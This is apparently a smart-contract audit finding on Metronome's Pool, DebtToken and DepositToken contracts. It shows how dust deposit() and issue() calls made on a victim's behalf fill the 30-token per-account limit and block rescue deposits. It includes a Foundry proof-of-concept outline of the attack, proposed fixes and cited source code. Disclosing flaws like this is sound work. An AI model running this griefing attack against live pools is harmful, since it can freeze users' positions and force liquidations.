### Title
Attacker permanently leaks victim's `debtTokensOfAccount`/`depositTokensOfAccount` slots via dust `issue()`/`deposit()` on behalf, blocking all future collateral/debt additions - ([File: contracts/DebtToken.sol](contracts/DebtToken.sol))

### Summary
Analogous to the missing `of_node_put()` refcount leak (a resource counter incremented but never released), Metronome keeps a per-account "reference list" of held tokens in `Pool.debtTokensOfAccount`/`depositTokensOfAccount`. Entries are added whenever a balance goes `0 → >0` and removed only when it returns to `0`. `DebtToken.issue(amount_, onBehalfOf_)` and `DepositToken.deposit(amount_, onBehalfOf_)` let anyone credit an arbitrary victim, so an unprivileged attacker can permanently occupy all `MAX_TOKENS_PER_USER = 30` slots of a victim with dust positions the victim cannot release, causing `UserReachedMaxTokens` on every subsequent add.

### Finding Description
`Pool.addToDebtTokensOfAccount`/`addToDepositTokensOfAccount` push the caller token into a `MappedEnumerableSet` under the account key and revert once `debtTokensOfAccount.length + depositTokensOfAccount.length >= 30` [1](#0-0) [2](#0-1) . Entries are added inside `DebtToken._mint` and `DepositToken._mint`/`_transfer` whenever the recipient's prior balance is zero [3](#0-2) [4](#0-3) . Removal only happens in `_burn`/`_transfer` when the balance reaches exactly zero [5](#0-4) [6](#0-5) .

The flaw: the beneficiary does not initiate or consent. `issue(amount_, onBehalfOf_)` is callable by anyone with their own collateral and assigns debt to an arbitrary `onBehalfOf_` (confirmed in tests: `msUSDDebt.connect(user2).issue(amount, user1.address)`), and `deposit(amount_, onBehalfOf_)` mints to any beneficiary [7](#0-6) . Debt-token dust is especially sticky: `balanceOf` includes accrued interest, so a dust debt never reaches zero, and the victim cannot repay it cheaply because `repay`/`repayAll` require burning the synthetic token the victim never received [8](#0-7) [9](#0-8) . The debt-floor check `RemainingDebtIsLowerThanTheFloor` only bounds debt *reduction*, and the floor check in `_mint` is skipped entirely when `debtFloorInUsd == 0` [10](#0-9) .

### Impact Explanation
Once a victim's combined list hits 30 entries, every code path that calls `addToDepositTokensOfAccount`/`addToDebtTokensOfAccount` for a *new* token reverts: `deposit(..., victim)` for collateral types the victim doesn't hold, `transfer`/`seize` of a new `DepositToken` to the victim, and any new `issue`. Concretely: a leveraged/borrowing victim whose position turns unhealthy cannot deposit a *different* collateral type to restore health — rescue deposits revert, forcing liquidation and, in stress conditions, bad debt. The leaked debt-dust entries also accrue interest forever, inflating `debtOf`/`debtPositionOf` reads for the victim. This is permanent freezing of the victim's ability to manage their position plus forced liquidation of collateral — direct loss of user funds.

### Likelihood Explanation
Cost is dust deposits of each listed deposit token plus dust `issue` calls per debt token (attacker supplies their own collateral and keeps the minted synth; the victim only gets the debt entry). No privileged role, oracle manipulation, or flash-loan capital is required; the attack uses only public `deposit`/`issue` entry points and persists indefinitely because interest-bearing debt dust never self-clears.

### Recommendation
- Make `issue`/`deposit` require `onBehalfOf_ == _msgSender()` or an explicit opt-in (e.g., only SmartFarmingManager/pool-internal callers may credit third parties).
- Alternatively, only call `addTo*TokensOfAccount` when the recipient is `_msgSender()`, or let any account purge entries whose balance is below a dust threshold.
- Enforce a minimum mint/deposit amount (e.g., relative to `debtFloorInUsd`) so dust cannot occupy a slot.

### Proof of Concept
Foundry fork outline (Hardhat equivalent exists in `test/Pool.test.ts`):

```solidity
// Setup: pool with N deposit tokens D[i] and M debt tokens T[i], victim V.
address attacker = makeAddr("attacker");

// 1) Fill victim's deposit-token list with dust
for (uint i; i < depositTokens.length; ++i) {
    IERC20 u = depositTokens[i].underlying();
    deal(address(u), attacker, 1);
    vm.startPrank(attacker);
    u.approve(address(depositTokens[i]), 1);
    depositTokens[i].deposit(1, victim); // addToDepositTokensOfAccount(victim)
    vm.stopPrank();
}

// 2) Fill remaining slots via dust debt issued on behalf of victim
//    attacker supplies own collateral so issue() succeeds
for (uint i; i < debtTokens.length && pool.getDebtTokensOfAccount(victim).length
        + pool.getDepositTokensOfAccount(victim).length < 30; ++i) {
    vm.prank(attacker);
    debtTokens[i].issue(dustAmount, victim); // addToDebtTokensOfAccount(victim)
}

assertEq(pool.getDepositTokensOfAccount(victim).length
       + pool.getDebtTokensOfAccount(victim).length, 30);

// 3) Victim cannot receive a new deposit token: rescue deposit reverts
vm.expectRevert(Pool.UserReachedMaxTokens.selector);
newDepositToken.deposit(amount, victim);

// 4) Dust debt entries are permanent: interest keeps balance > 0,
//    victim lacks the synthetic token needed for repayAll().
``` [11](#0-10) [12](#0-11)

### Citations

**File:** contracts/Pool.sol (L78-80)
```text
     */
    uint256 public constant MAX_TOKENS_PER_USER = 30;

```

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L204-220)
```text
    function addToDebtTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _debtToken = _msgSender();
        _revertIfSenderIsNotDebtToken(_debtToken);
        if (!debtTokensOfAccount.add(account_, _debtToken)) revert DebtTokenAlreadyExists();
    }

    /**
     * @notice Add a deposit token to the per-account list
     * @dev This function is called from `DepositToken` when user's balance changes from `0`
     * @dev The caller should ensure to not pass `address(0)` as `_account`
     * @param account_ The account address
     */
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** contracts/DebtToken.sol (L453-454)
```text
        _syntheticToken.burn(_msgSender, _repaid);
        _burn(onBehalfOf_, _repaid);
```

**File:** contracts/DebtToken.sol (L491-492)
```text
        _syntheticToken.burn(_msgSender, _repaid);
        _burn(onBehalfOf_, _repaid);
```

**File:** contracts/DebtToken.sol (L525-543)
```text
    function _burn(address account_, uint256 amount_) private updateRewardsBeforeMintOrBurn(account_) {
        if (account_ == address(0)) revert BurnFromNullAddress();

        uint256 _accountBalance = balanceOf(account_);
        if (_accountBalance < amount_) revert BurnAmountExceedsBalance();

        unchecked {
            principalOf[account_] = _accountBalance - amount_;
            debtIndexOf[account_] = debtIndex;
            totalSupply_ -= amount_;
        }

        emit Transfer(account_, address(0), amount_);

        // Remove this token from the debt tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf(account_) == 0) {
            pool.removeFromDebtTokensOfAccount(account_);
        }
    }
```

**File:** contracts/DebtToken.sol (L583-588)
```text
        if (
            _debtFloorInUsd > 0 &&
            masterOracle_.quoteTokenToUsd(address(syntheticToken), _balanceBefore + amount_) < _debtFloorInUsd
        ) {
            revert DebtLowerThanTheFloor();
        }
```

**File:** contracts/DebtToken.sol (L597-600)
```text
        //  Add this token to the debt tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDebtTokensOfAccount(account_);
        }
```

**File:** contracts/DepositToken.sol (L211-235)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);

```

**File:** contracts/DepositToken.sol (L459-462)
```text
        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (_amount > 0 && _balanceAfter == 0) {
            pool.removeFromDepositTokensOfAccount(_account);
        }
```

**File:** contracts/DepositToken.sol (L485-488)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(account_);
        }
```
